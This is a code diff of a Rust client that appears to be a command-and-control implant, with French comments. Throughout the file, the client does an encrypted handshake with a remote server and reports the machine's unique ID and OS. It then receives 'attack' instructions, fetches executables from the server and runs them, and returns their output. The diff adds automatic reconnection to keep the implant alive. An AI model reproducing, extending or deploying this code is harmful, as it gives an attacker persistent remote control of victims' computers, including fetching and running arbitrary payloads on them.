@@ -3,16 +3,14 @@ mod connexion;
 // use std::borrow::Borrow;
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-// use std::thread;
 use std::str;
-// use std::sync::mpsc;
 
-// use object::Error;
 // Handshake
 use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};
 use rsa::pkcs8::{EncodePublicKey, LineEnding};
 use rand::rngs::OsRng;
 use serde_json;
+
 
 use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
 use serde::{Deserialize, Serialize};
@@ -26,6 +24,7 @@ type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
 use std::process::{Command};
 use std::time::Duration;
+use std::thread;
 
 #[cfg(client_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
@@ -72,7 +71,7 @@ fn struct_to_json_handshake_stc(data: HandshakeConfJson) -> String {
 
 // Send data to server as bytes vector to the server
 fn send_encrypted_data_to_server(
-    mut stream: TcpStream,
+    mut stream: &TcpStream,
     data: Vec<u8>,
     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
@@ -112,7 +111,7 @@ fn send_encrypted_data_to_server(
 
 // Send string to server
 fn send_encrypted_string_to_server(
-    stream: TcpStream,
+    stream: &TcpStream,
     data: String,
     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
@@ -124,7 +123,7 @@ fn send_encrypted_string_to_server(
 
 // Receive encrypted data from server
 fn receive_encrypted_data_from_server(
-    mut stream: TcpStream,
+    mut stream: &TcpStream,
     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
 )-> Result<Vec<u8>, ()>{
@@ -182,7 +181,7 @@ fn receive_encrypted_data_from_server(
 
 // Receive encrypted string from the server
 fn receive_encrypted_string_from_server(
-    stream: TcpStream,
+    stream: &TcpStream,
     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
 ) -> String{
@@ -212,7 +211,6 @@ fn receive_encrypted_file_from_server(
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     size_expected: usize,
 ) -> Result<Vec<u8>, String> {
-    // TODO
 
     stream.set_read_timeout(Some(Duration::new(60, 0)));
 
@@ -265,7 +263,7 @@ fn check_and_request_executable(
                                     executable_dir: &str,
                                     symetric_key: &GenericArray<u8, typenum::consts::U16>,
                                     iv: &GenericArray<u8, typenum::consts::U16>,
-                                    stream: TcpStream
+                                    stream: &TcpStream
                                     ) -> io::Result<()> {
 
     #[cfg(client_os = "windows")]
@@ -282,13 +280,13 @@ fn check_and_request_executable(
         loop{
             // Envoi du json de requete pour l'executable
             let request_message = format!("{{\"request\":\"{}\"}}", executable_name);
-            send_encrypted_string_to_server(stream.try_clone()?, request_message, symetric_key.clone(), iv.clone());
+            send_encrypted_string_to_server(&stream, request_message, symetric_key.clone(), iv.clone());
             println!("\t\t[+] Request sent");
 
 
             // Attente de l'envoi du fichier
             println!("\t\t[+] waiting for file data");
-            match receive_encrypted_data_from_server(stream.try_clone()?, symetric_key.clone(), iv.clone()){
+            match receive_encrypted_data_from_server(&stream, symetric_key.clone(), iv.clone()){
                 Ok(data_file) => {
                     println!("\t\t[+] file data received");
                     
@@ -328,7 +326,7 @@ fn execute_attack(
     args: &str,
     symetric_key: &GenericArray<u8, typenum::consts::U16>,
     iv: &GenericArray<u8, typenum::consts::U16>,
-    stream: TcpStream,
+    stream: &TcpStream,
 ) ->  io::Result<String> {
     let executable_dir = "./actions";
 
@@ -369,130 +367,167 @@ fn execute_attack(
 }
 
 fn main() -> io::Result<()> {
-    // Connexion
-    let mut stream: TcpStream = connexion::connexion()?;
 
 
-    // ========== HANDSHAKE ==========
-    println!("[+] starting Handshake");
-    // Génération de la paire de clés RSA
-    let mut rng = OsRng;
-    let bits = 2048;
-    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
-    let public_key = RsaPublicKey::from(&private_key);
+    let mut connected: bool = false;
+    let mut first_connection: bool = true;
 
-    let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();
+    let mut symetric_key = GenericArray::default();
+    let mut iv = GenericArray::default();
 
-    // Envoi de la clé publique au serveur python
-    // sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();
-    stream.write_all(pkcs1_encoded_public_pem.as_bytes()).expect("Erreur lors de l'envoi du message");
+    let mut stream = connexion::connect(5000)?;
 
-    // Réception de la clé symétrique chiffrée
-    // let encrypted_handshake_data = receiver.recv().unwrap();
-    let mut encrypted_handshake_data = [0; 256];
 
-    match stream.read(&mut encrypted_handshake_data) {
-        Ok(bytes_read) => {
-            if bytes_read == 0 {
-                // La connexion a été fermée
-                eprintln!("/!\\ La communication a été coupée pendant le handshake /!\\");
+    loop{
+        
+        if connected == false {
+            
+            if first_connection == false{
+                println!("[!] Trying to reconnect to the server");
+                match connexion::connect(5000) {
+                    Ok(new_stream) => {
+                        stream = new_stream;
+                    }
+                    Err(_) => {
+                        println!("[!] Error while reconnecting to the server");
+                        continue;
+                    }
+                }
+            }else{
+                first_connection = false
             }
+            
+                
+
+
+            // ========== HANDSHAKE ==========
+            println!("[+] starting Handshake");
+            // Génération de la paire de clés RSA
+            let mut rng = OsRng;
+            let bits = 2048;
+            let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
+            let public_key = RsaPublicKey::from(&private_key);
+
+            let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();
+
+            // Envoi de la clé publique au serveur python
+            // sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();
+            stream.write_all(pkcs1_encoded_public_pem.as_bytes()).expect("Erreur lors de l'envoi du message");
+
+            // Réception de la clé symétrique chiffrée
+            // let encrypted_handshake_data = receiver.recv().unwrap();
+            let mut encrypted_handshake_data = [0; 256];
+
+            match stream.read(&mut encrypted_handshake_data) {
+                Ok(bytes_read) => {
+                    if bytes_read == 0 {
+                        // La connexion a été fermée
+                        eprintln!("/!\\ La communication a été coupée pendant le handshake /!\\");
+                    }
+                }
+                Err(err) => {
+                    eprintln!("Erreur lors de la lecture: {}", err);
+                }
+            }
+
+            // Déchiffrement de la clé symétrique
+            let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_handshake_data).unwrap();
+
+            let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());
+
+            let _stealth_mode = handshake_data.stealth;
+            let _multithread_mode = handshake_data.multithread;
+
+            // Decode the base64 key
+            match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()) {
+                Ok(decoded_sym_key) => {
+                    symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
+                }
+                Err(err) => {
+                    eprintln!("Error decoding base64 symetric key: {}", err);
+                    symetric_key = GenericArray::default();
+                }
+            };
+
+            // Decode the base64 iv
+            match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()) {
+                Ok(decoded_iv) => {
+                    iv = GenericArray::clone_from_slice(&decoded_iv);
+                }
+                Err(err) => {
+                    eprintln!("Error decoding base64 iv: {}", err);
+                    iv = GenericArray::default();
+                }
+            };
+
+            #[cfg(client_os = "windows")]
+            let os = "windows";
+
+            #[cfg(client_os = "linux")]
+            let os = "linux";
+
+            let uid = machine_uid::get().unwrap();
+
+            let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\", \"os\":\"{}\"}}", uid, os);
+
+            // Chiffrement de la config du client
+            let mut buffer = vec![0u8; 96]; // Adjust buffer size
+            let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
+                .encrypt_padded_b2b_mut::<Pkcs7>(&handshake_response.as_bytes(), &mut buffer)
+                .unwrap();
+
+
+            // Envoi de la config du client au serveur
+            // send_encrypted_string_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());
+            stream.write_all(encrypted_data).expect("Erreur lors de l'envoi du message");
+            
+
+            println!("[+] end Handshake");
+
+            connected = true;
         }
-        Err(err) => {
-            eprintln!("Erreur lors de la lecture: {}", err);
+
+        // ========== END HANDSHAKE ==========
+
+
+        // ========== MAIN LOOP ==========
+        if connected == true {
+            let stream_clone: TcpStream = stream.try_clone().expect("Error while cloning stream in thread");
+            
+            let message = receive_encrypted_string_from_server(&stream_clone, symetric_key.clone(), iv);
+
+            println!("Message reçu : {}", message);
+
+            if message != "" {
+
+                if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
+                    println!("[?] instruction reçue : {}", json_attack.attack);
+
+                    let id_attack = json_attack.id;
+                    let type_attack = json_attack.attack;
+
+                    let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
+
+                    match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, &stream_clone) {
+                        Ok(output) => {
+                            let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
+                            send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                        }
+                        Err(e) => {
+                            let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
+                            send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                            println!("Error executing attack: {}", e);
+                        }
+                    }
+                }
+            }else{
+                println!("[!] Disconnected from server");
+                connected = false;
+            }
         }
     }
 
-    // Déchiffrement de la clé symétrique
-    let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_handshake_data).unwrap();
-
-    let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());
-
-    let _stealth_mode = handshake_data.stealth;
-    let _multithread_mode = handshake_data.multithread;
-
-    // Decode the base64 key
-    let symetric_key;
-    match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()) {
-        Ok(decoded_sym_key) => {
-            symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
-        }
-        Err(err) => {
-            eprintln!("Error decoding base64 symetric key: {}", err);
-            symetric_key = GenericArray::default();
-        }
-    };
-
-    // Decode the base64 iv
-    let iv;
-    match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()) {
-        Ok(decoded_iv) => {
-            iv = GenericArray::clone_from_slice(&decoded_iv);
-        }
-        Err(err) => {
-            eprintln!("Error decoding base64 iv: {}", err);
-            iv = GenericArray::default();
-        }
-    };
-
-    #[cfg(client_os = "windows")]
-    let os = "win";
-
-    #[cfg(client_os = "linux")]
-    let os = "lin";
-
-    let uid = machine_uid::get().unwrap();
-
-    let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\", \"os\":\"{}\"}}", uid, os);
-
-    // Chiffrement de la config du client
-    let mut buffer = vec![0u8; 96]; // Adjust buffer size
-    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
-        .encrypt_padded_b2b_mut::<Pkcs7>(&handshake_response.as_bytes(), &mut buffer)
-        .unwrap();
-
-
-    // Envoi de la config du client au serveur
-    // send_encrypted_string_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());
-    stream.write_all(encrypted_data).expect("Erreur lors de l'envoi du message");
-    
-
-    println!("[+] end Handshake");
-
-    // ========== END HANDSHAKE ==========
-    let stream_clone = stream.try_clone().expect("Error while cloning stream in thread");
-
-
-    loop {
-        let stream_clone_clone = stream_clone.try_clone().expect("Error while cloning stream in thread");
-        let message = receive_encrypted_string_from_server(stream_clone_clone, symetric_key.clone(), iv.clone());
-
-        println!("Message reçu : {}", message);
-
-
-        if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
-            println!("[?] instruction reçue : {}", json_attack.attack);
-
-            let id_attack = json_attack.id;
-            let type_attack = json_attack.attack;
-
-            let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
-
-            match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, stream_clone.try_clone().expect("REASON")) {
-                Ok(output) => {
-                    let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
-                    send_encrypted_string_to_server(stream_clone.try_clone().expect("REASON"), response, symetric_key.clone(), iv.clone());
-                }
-                Err(e) => {
-                    let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
-                    send_encrypted_string_to_server(stream_clone.try_clone().expect("REASON"), response, symetric_key.clone(), iv.clone());
-                    println!("Error executing attack: {}", e);
-                }
-            }
-        }
-    }
-
-    Ok(())
+    // Ok(())
 }
 
 
